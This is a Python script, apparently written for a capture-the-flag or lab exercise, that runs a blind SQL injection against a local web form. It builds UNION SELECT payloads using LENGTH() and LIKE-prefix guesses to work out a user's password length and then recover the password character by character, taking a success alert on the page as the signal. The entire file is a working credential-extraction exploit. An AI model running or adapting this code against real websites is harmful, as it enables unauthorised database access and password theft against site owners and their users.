from requests import post
from bs4 import BeautifulSoup
import urllib
from itertools import count, combinations_with_replacement
from string import hexdigits
from tqdm import tqdm


def main():
    ip = 'http://0.0.0.0/'
    name = 'inspector_derrick'
    page = 'messages'

    print("Checking password length...")

    for length in count(1):

        injection = build_inj_len(length, name)

        data = {'name': injection}

        url = ip + page

        response = post(url, data=data)
        body = response.text

        soup = BeautifulSoup(body, 'html.parser')
        if (soup.findAll('div', {'class': 'alert-success'})):
            print("The password is " + str(length) + " chars long.")
            break
    
    chars = hexdigits

    password = ''

    print("Checking password...")
    
    for i in tqdm(range(length)):
        for letter in chars:
            
            injection = build_inj_password(name, password, letter)

            data = {'name': injection}

            url = ip + page

            response = post(url, data=data)
            body = response.text
            soup = BeautifulSoup(body, 'html.parser')
            if (soup.findAll('div', {'class': 'alert-success'})):
                password += letter
                break
    
    print("\nThe password is:")
    print(password)

    

def build_inj_len(i: int, name: str) -> str:
    
    inj1 = '\' union select name,password from users where name= \''
    inj2 = '\' and LENGTH(password)=\'' + str(i)
    end = '\' -- '

    return inj1 + name + inj2 + end

def build_inj_password(name: str, password: str, letter: str) -> str:
    
    inj1 = '\' union select name,password from users where name= \''
    inj2 = '\' and password like\'' + password + letter + '%'
    end = '\' -- '

    return inj1 + name + inj2 + end

if __name__ == "__main__":
    main()